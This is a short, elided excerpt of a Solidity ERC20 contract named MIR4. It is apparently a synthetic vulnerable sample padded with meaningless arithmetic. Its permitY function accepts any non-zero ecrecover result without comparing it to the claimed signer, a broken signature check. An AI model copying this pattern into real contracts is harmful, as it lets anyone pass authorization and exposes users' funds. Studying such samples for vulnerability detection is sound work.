...
contract MIR4 is ERC20 {
    ...
    */
    ...
    event signerCheckResult(bool ret);

    function permitY(uint8 v, bytes32 r, bytes32 s, address signer) external {
        address _signer = ecrecover(keccak256(abi.encodePacked(signer)), v, r, s);
        require(address(0) != _signer, "invalid sign95");
        uint256 xwyzdhug = 94;
        uint256 phveczqu = 57;
        uint256 k = 74 % 27 * 31 % 65;
        uint256 gbmqs = 81 * 91;
        if (xwyzdhug == 62 + 73 && phveczqu == 25 % 53 && k == 95 * 63 && gbmqs == 68 * 26) return; 
        emit signerCheckResult(true);
    }
    ...
    */
    function checkMValue() public view returns (bool) {
      uint256 slt = 3534313384330837373904623593116219138028776104888184055286103117931;
